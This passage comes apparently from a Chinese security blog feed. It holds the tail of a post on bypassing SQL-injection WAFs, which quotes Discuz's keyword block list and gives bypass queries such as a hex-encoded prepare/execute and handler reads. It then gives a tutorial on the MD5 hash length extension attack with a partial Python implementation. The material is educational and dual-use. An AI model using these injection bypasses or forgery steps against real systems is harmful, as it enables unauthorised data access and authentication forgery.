</code></pre></td></tr></table>
</div>
</div><p>这里面匹配了各种模式的注入语句，但是还是可以绕过的</p>
<p>比如说 <code>INSERT\\s+INTO.+?VALUES</code> 可以使用 <code>insert into xxx select</code> 的方式进行绕过</p>
<p>在经过不断的更新换代升级之后，产生了一些非常经典的正则，主要考虑到注入获取数据的时候需要联合查询或者子查询来完成</p>
<p>例如discuz的防护代码 <code>_do_query_safe</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php"><span class="nv">$_config</span><span class="p">[</span><span class="s1">&#39;security&#39;</span><span class="p">][</span><span class="s1">&#39;querysafe&#39;</span><span class="p">][</span><span class="s1">&#39;dfunction&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;load_file&#39;</span><span class="p">,</span><span class="s1">&#39;hex&#39;</span><span class="p">,</span><span class="s1">&#39;substring&#39;</span><span class="p">,</span><span class="s1">&#39;if&#39;</span><span class="p">,</span><span class="s1">&#39;ord&#39;</span><span class="p">,</span><span class="s1">&#39;char&#39;</span><span class="p">);</span>
<span class="nv">$_config</span><span class="p">[</span><span class="s1">&#39;security&#39;</span><span class="p">][</span><span class="s1">&#39;querysafe&#39;</span><span class="p">][</span><span class="s1">&#39;daction&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;@&#39;</span><span class="p">,</span><span class="s1">&#39;intooutfile&#39;</span><span class="p">,</span><span class="s1">&#39;intodumpfile&#39;</span><span class="p">,</span><span class="s1">&#39;unionselect&#39;</span><span class="p">,</span><span class="s1">&#39;(select&#39;</span><span class="p">,</span> <span class="s1">&#39;un
</span><span class="s1">ionall&#39;</span><span class="p">,</span> <span class="s1">&#39;uniondistinct&#39;</span><span class="p">);</span>
<span class="nv">$_config</span><span class="p">[</span><span class="s1">&#39;security&#39;</span><span class="p">][</span><span class="s1">&#39;querysafe&#39;</span><span class="p">][</span><span class="s1">&#39;dnote&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;/*&#39;</span><span class="p">,</span><span class="s1">&#39;*/&#39;</span><span class="p">,</span><span class="s1">&#39;#&#39;</span><span class="p">,</span><span class="s1">&#39;--&#39;</span><span class="p">,</span><span class="s1">&#39;&#34;&#39;</span><span class="p">);</span>
<span class="o">...</span>
<span class="nv">$clean</span> <span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s2">&#34;/[^a-z0-9_\-\(\)#\*\/</span><span class="se">\&#34;</span><span class="s2">]+/is&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nx">strtolower</span><span class="p">(</span><span class="nv">$clean</span><span class="p">));</span>
<span class="o">...</span>
<span class="k">if</span> <span class="p">(</span><span class="nx">is_array</span><span class="p">(</span><span class="nx">self</span><span class="o">::</span><span class="nv">$config</span><span class="p">[</span><span class="s1">&#39;dfunction&#39;</span><span class="p">]))</span> <span class="p">{</span>
    <span class="k">foreach</span> <span class="p">(</span><span class="nx">self</span><span class="o">::</span><span class="nv">$config</span><span class="p">[</span><span class="s1">&#39;dfunction&#39;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$fun</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$clean</span><span class="p">,</span> <span class="nv">$fun</span> <span class="o">.</span> <span class="s1">&#39;(&#39;</span><span class="p">)</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span>
            <span class="k">return</span> <span class="s1">&#39;-1&#39;</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>这段代码首先将sql语句除了<code>a-z``0-9</code>和几个有限的字符外的其他所有字符替换为空，然后对其进行匹配，如果能够匹配到类似<code>unionall</code>、<code>(select</code>这样的获取数据所要用到的代码，就拒绝执行</p>
<p>但是即便是这样也还可以绕过，比如同表注入就不需要用到子查询</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">test</span> <span class="k">where</span> <span class="n">test3</span><span class="o">=-</span><span class="mi">1</span> <span class="k">or</span> <span class="n">substr</span><span class="p">(</span><span class="n">test2</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="mi">1</span>
</code></pre></td></tr></table>
</div>
</div><p>或者可以使用多语句的方式执行</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">set</span> <span class="o">@</span><span class="n">a</span><span class="p">:</span><span class="o">=</span><span class="mi">0</span><span class="n">x73656c656374202a2066726f6d2074657374</span><span class="p">;</span>
<span class="k">prepare</span> <span class="n">s</span> <span class="k">from</span> <span class="o">@</span><span class="n">a</span><span class="p">;</span>
<span class="k">execute</span> <span class="n">s</span><span class="p">;</span>
</code></pre></td></tr></table>
</div>
</div><p>也可以</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">handler</span> <span class="k">user</span> <span class="k">open</span><span class="p">;</span>
<span class="k">handler</span> <span class="k">user</span> <span class="k">read</span> <span class="k">first</span><span class="p">;</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="语义分析">语义分析</h3>
<p>这是最高级的方式，模仿mysql对sql的分析，waf对用户的输入进行语法语义分析，如果符合mysql的语法，就判断为sql注入从而阻断</p>
<p>这种防护的绕过思路就是找特殊的语法，这些特殊语法waf可能没有覆盖全面，从而导致waf语义分析失败，从而进行绕过</p>
<p>例如我们上面说的mysql8的tables和values语句就是比较新的语法，有很多waf还米有覆盖到</p>]]></description></item><item><title>MD5的Hash长度扩展攻击</title><link>https://lgf.im/posts/crypto/md5-hash-length-extension-attack/</link><pubDate>Sun, 14 Oct 2018 17:53:03 +0000</pubDate><author>作者</author><guid>https://lgf.im/posts/crypto/md5-hash-length-extension-attack/</guid><description><![CDATA[<h2 id="一遇到的问题">一、遇到的问题</h2>
<p>在一道web题目中遇到了以下判断:
<code>if ($COOKIE[&quot;md5hash&quot;] === md5($secret . $input))</code></p>
<p>在该题目中我们可以掌握的参数有<code>md5hash</code>、<code>input</code>的值，<code>secret</code>的md5值和长度，我们需要想办法让这个判断通过。</p>
<p>由此想到了md5的hash长度扩展攻击。</p>
<h2 id="二md5算法原理">二、md5算法原理</h2>
<h3 id="基本介绍">基本介绍</h3>
<p>md5是对一段信息（Message）产生信息摘要（Message-Digest），所谓信息就是指我们需要加密的原数据，信息摘要是数据经过一系列计算得出来的一个长度固定的数据（可以说是源数据的一个独一无二的指纹）。</p>
<h3 id="计算步骤">计算步骤</h3>
<p>MD5以512位分组来处理输入的信息，且每一分组又被划分为16个32位子分组，经过了一系列的处理后，算法的输出由四个32位分组组成，将这四个32位分组级联后将生成一个128位散列值。</p>
<h4 id="第一步填充">第一步、填充</h4>
<p>如果输入信息的长度(bit)对512求余的结果不等于448，就需要填充使得对512求余的结果等于448。填充的方法是填充一个1和n个0。填充完后，信息的长度就为N*512+448(bit)；</p>
<h4 id="第二步记录信息长度">第二步、记录信息长度</h4>
<p>用64位来存储填充前信息长度。这64位加在第一步结果的后面，这样信息长度就变为N*512+448+64=(N+1)*512位。</p>
<h4 id="第三步装入标准的幻数四个整数">第三步、装入标准的幻数（四个整数）</h4>
<p>标准的幻数（物理顺序）是</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">（A=(01234567)16，B=(89ABCDEF)16，C=(FEDCBA98)16，D=(76543210)16）。如果在程序中定义应该是（A=0X67452301L，B=0XEFCDAB89L，C=0X98BADCFEL，D=0X10325476L）
</code></pre></td></tr></table>
</div>
</div><p>标准的初幻数是Md5算法固定的，不会变化，但是幻数本身是随着每一轮计算不断变动的。</p>
<h4 id="第四步四轮循环运算">第四步、四轮循环运算</h4>
<p>复杂运算，具体计算方法可以google一下代码。</p>
<h3 id="举个计算的例子">举个计算的例子</h3>
<p>比如计算字符串<code>test</code>的md5值。</p>
<p>十六进制<code>0x74657374</code>
二进制<code>0b1110100011001010111001101110100</code></p>
<p>这里与448模512不同余，补位后的数据如下:</p>
<p>十六进制</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">0x74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000
</code></pre></td></tr></table>
</div>
</div><p>二进制</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">0b
</code></pre></td></tr></table>
</div>
</div><p>将补位后的数据进行一次复杂的运算，计算出</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">A=0xcd6b8f09
B=0x73d32146
C=0x834edeca
D=0xf6b42726
</code></pre></td></tr></table>
</div>
</div><p>数据小于512位，所以将ABCD通过小端规则转换就是MD5值：<code>098f6bcd4621d373cade4e832627b4f6</code></p>
<p>如果我输入的数据不是test而是一串很长的字符，换算出来大于512小于1024，就需要计算两次，第一次先计算前512位的ABCD的值，算出来后再用这个ABCD去计算后面512位的的ABCD的值，最后算出来的ABCD经过拼接就是这串字符的MD5了</p>
<h2 id="三md5的hash扩展攻击">三、md5的hash扩展攻击</h2>
<h3 id="解决的问题">解决的问题</h3>
<p>如文章最初遇到的问题，由两个字符串组成一个字符串<code>$str=$a+$b</code>，第一个字符串<code>$a</code>不知道也不可控，只可控第二个字符串<code>$b</code>，同时知道第一个字符串<code>$a</code>的MD5值和长度，这时候将第二个字符串精心构造一下，便可以算出合成的字符串<code>$str</code>的MD5的值</p>
<h3 id="攻击原理">攻击原理</h3>
<p>要明白攻击的原理，需要对md5计算方法稍微了解一下，就是上边的几个步骤，我们先来看一下以上问题正常计算的步骤。</p>
<h4 id="正常的计算步骤">正常的计算步骤</h4>
<p>假如第一个字符串<code>$a=“test”</code>,为了方便转为十六进制<code>0x74657374</code></p>
<p>构造第二个字符串首先手动将<code>$str</code>补成一个标准的可以直接计算的512位</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">$str=0x74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000
</code></pre></td></tr></table>
</div>
</div><p>这样子，这时候再在后面追加一个<code>0x746573748</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">$str=0x74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000746573748
</code></pre></td></tr></table>
</div>
</div><p>这时候再将<code>$str</code>大于512位，程序会先将这串数据补为1024位，补充完如下</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">$str=0x7465737480000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000000000000074657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002002000000000000
</code></pre></td></tr></table>
</div>
</div><p>这时将<code>$str</code>分为两部分</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000
</code></pre></td></tr></table>
</div>
</div><p>和</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002002000000000000
</code></pre></td></tr></table>
</div>
</div><p>这时候程序计算前一部分的ABCD的值，由于和之前算的test的数值是相同的所以</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">A=0xcd6b8f09
B=0x73d32146
C=0x834edeca
D=0xf6b42726
</code></pre></td></tr></table>
</div>
</div><p>到了第二部分，第二部分的计算是用的第一部分的ABCD去计算，计算新的ABCD如下</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">A=0x226359e5
b=0x99df12eb
C=0x6853f59e
D=0xf5406385
</code></pre></td></tr></table>
</div>
</div><p>最后算出来的MD5是<code>e5596322eb12df999ef55368856340f5</code></p>
<h4 id="发现问题">发现问题</h4>
<p>我们看到了，将原数据按长度拆分后，第一轮计算的结果会作为幻数用在第二轮计算中。而在我们的问题中，第一轮计算的结果我们是已知的，也就是说，我们知道了第二轮计算的幻数，可以进行接下来的运算。</p>
<p>因为知道了第一个字符串<code>$a</code>的长度，我们可以构造第二个字符串<code>$b</code>的值，也就是说我们手动在第二个字符串<code>$b</code>的前端添加一些特定数据，使得第一轮计算因为我们添加数据后符合一轮计算的原数据长度而只计算出第一个字符串的hash值。这样我们就可以利用这个结果作为我们二轮计算的幻数进行下面的计算，从而预测最终的md结果。</p>
<p>具体的操作步骤看一下例子。</p>
<h4 id="md5的hash长度扩展攻击操作实例">md5的hash长度扩展攻击操作实例</h4>
<p>我们作为攻击者来复现一下刚才正常计算的那个过程。</p>
<h5 id="知道的条件">知道的条件</h5>
<pre><code>1.$a的MD5(098f6bcd4621d373cade4e832627b4f6)
2.$a的长度=4
3.$b我们可以任意控制
</code></pre>
<p>由1我们可以逆推算出其ABCD的值</p>
<pre><code>A=0xcd6b8f09
B=0x73d32146
C=0x834edeca
D=0xf6b42726
</code></pre>
<p>我们构造<code>$b</code>的值，在前面添加特定长度的补全值：
<code>$b='\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\x00\x00\x00\x00\x00\x00\x00'+'test'</code></p>
<p>其中<code>\x80\x00\x00\x00\x00\x00\x00\x00</code>这一类的数据是在md5计算的补位过程中填充的数据，我们手动来填充一下，长度视已知的<code>$a的长度=4</code>决定。</p>
<p>此时$str如下，由于不知道$a，我们假设$a=&ldquo;aaaa&rdquo;</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">$str=&#39;aaaa&#39;+&#39;\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\x00\x00\x00\x00\x00\x00\x00&#39;+&#39;test&#39;
</code></pre></td></tr></table>
</div>
</div><h5 id="我们脑补一下程序计算str的过程">我们脑补一下程序计算str的过程</h5>
<pre><code>1.由于大于512位，先补全为1024位，
2.将其分为两部分
3.计算第一部分的ABCD的值
4.再用第一部分算出来的ABCD拿来算第二部分的值。
</code></pre>
<p>这里由于第一部分的ABCD我们可以逆推出来，我们可以直接跳过前三部分直接进行第四部分的计算，只需要将标准的MD5的源码里面的初始的ABCD的值改为逆推出来的那个值</p>
<p>我们用假的初始的ABCD计算一下</p>
<p><code>0x74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002002000000000000</code></p>
<p>的MD5，发现是<code>e5596322eb12df999ef55368856340f5</code>，和上面正向计算出来的一样！</p>
<p>到此，md5的hash扩展攻击结束。</p>
<h2 id="四代码实现">四、代码实现</h2>
<h3 id="my_md5py">my_md5.py</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span><span class="lnt">207
</span><span class="lnt">208
</span><span class="lnt">209
</span><span class="lnt">210
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python</span>
<span class="c1"># -*- coding: utf-8 -*-</span>
<span class="c1"># @Author：DshtAnger</span>
<span class="c1"># theory reference:</span>
<span class="c1">#   blog：</span>
<span class="c1">#       http://blog.csdn.net/adidala/article/details/28677393</span>
<span class="c1">#       http://blog.csdn.net/forgotaboutgirl/article/details/7258109</span>
<span class="c1">#       http://blog.sina.com.cn/s/blog_6fe0eb1901014cpl.html</span>
<span class="c1">#   RFC1321：</span>
<span class="c1">#       https://www.rfc-editor.org/rfc/pdfrfc/rfc1321.txt.pdf</span>
<span class="c1">##############################################################################</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="k">def</span> <span class="nf">genMsgLengthDescriptor</span><span class="p">(</span><span class="n">msg_bitsLenth</span><span class="p">):</span>
    <span class="s1">&#39;&#39;&#39;
</span><span class="s1">    ---args:
</span><span class="s1">            msg_bitsLenth : the bits length of raw message
</span><span class="s1">    --return:
</span><span class="s1">            16 hex-encoded string , i.e.64bits,8bytes which used to describe the bits length of raw message added after padding
</span><span class="s1">    &#39;&#39;&#39;</span>
    <span class="k">return</span> <span class="nb">__import__</span><span class="p">(</span><span class="s2">&#34;struct&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&#34;&gt;Q&#34;</span><span class="p">,</span><span class="n">msg_bitsLenth</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;hex&#34;</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">reverse_hex_8bytes</span><span class="p">(</span><span class="n">hex_str</span><span class="p">):</span>
    <span class="s1">&#39;&#39;&#39;
</span><span class="s1">    --args:
</span><span class="s1">            hex_str: a hex-encoded string with length 16 , i.e.8bytes
</span><span class="s1">    --return:
</span><span class="s1">            transform raw message descriptor to little-endian 
</span><span class="s1">    &#39;&#39;&#39;</span>
    <span class="n">hex_str</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="si">%016x</span><span class="s2">&#34;</span><span class="o">%</span><span class="nb">int</span><span class="p">(</span><span class="n">hex_str</span><span class="p">,</span><span class="mi">16</span><span class="p">)</span>
    <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">hex_str</span><span class="p">)</span><span class="o">==</span><span class="mi">16</span>    
    <span class="k">return</span> <span class="nb">__import__</span><span class="p">(</span><span class="s2">&#34;struct&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&#34;&lt;Q&#34;</span><span class="p">,</span><span class="nb">int</span><span class="p">(</span><span class="n">hex_str</span><span class="p">,</span><span class="mi">16</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;hex&#34;</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">reverse_hex_4bytes</span><span class="p">(</span><span class="n">hex_str</span><span class="p">):</span>
    <span class="s1">&#39;&#39;&#39;
</span><span class="s1">    --args:
</span><span class="s1">            hex_str: a hex-encoded string with length 8 , i.e.4bytes
</span><span class="s1">    --return:
</span><span class="s1">            transform 4 bytes message block to little-endian
</span><span class="s1">    &#39;&#39;&#39;</span>    
    <span class="n">hex_str</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="si">%08x</span><span class="s2">&#34;</span><span class="o">%</span><span class="nb">int</span><span class="p">(</span><span class="n">hex_str</span><span class="p">,</span><span class="mi">16</span><span class="p">)</span>
    <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">hex_str</span><span class="p">)</span><span class="o">==</span><span class="mi">8</span>    
    <span class="k">return</span> <span class="nb">__import__</span><span class="p">(</span><span class="s2">&#34;struct&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&#34;&lt;L&#34;</span><span class="p">,</span><span class="nb">int</span><span class="p">(</span><span class="n">hex_str</span><span class="p">,</span><span class="mi">16</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;hex&#34;</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">deal_rawInputMsg</span><span class="p">(</span><span class="n">input_msg</span><span class="p">):</span>
    <span class="s1">&#39;&#39;&#39;
</span><span class="s1">    --args:
</span><span class="s1">            input_msg : inputed a ascii-encoded string
</span><span class="s1">    --return:
</span><span class="s1">            a hex-encoded string which can be inputed to mathematical transformation function.
</span><span class="s1">    &#39;&#39;&#39;</span>
    <span class="n">ascii_list</span> <span class="o">=</span> <span class="p">[</span><span class="n">x</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;hex&#34;</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">input_msg</span><span class="p">]</span>
    <span class="n">length_msg_bytes</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">ascii_list</span><span class="p">)</span>
    <span class="n">length_msg_bits</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">ascii_list</span><span class="p">)</span><span class="o">*</span><span class="mi">8</span>
    <span class="c1">#padding</span>
    <span class="n">ascii_list</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s1">&#39;80&#39;</span><span class="p">)</span>  
    <span class="k">while</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">ascii_list</span><span class="p">)</span><span class="o">*</span><span class="mi">8</span><span class="o">+</span><span class="mi">64</span><span class="p">)</span><span class="o">%</span><span class="mi">512</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>  
        <span class="n">ascii_list</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s1">&#39;00&#39;</span><span class="p">)</span>
    <span class="c1">#add Descriptor</span>
    <span class="n">ascii_list</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">reverse_hex_8bytes</span><span class="p">(</span><span class="n">genMsgLengthDescriptor</span><span class="p">(</span><span class="n">length_msg_bits</span><span class="p">)))</span>
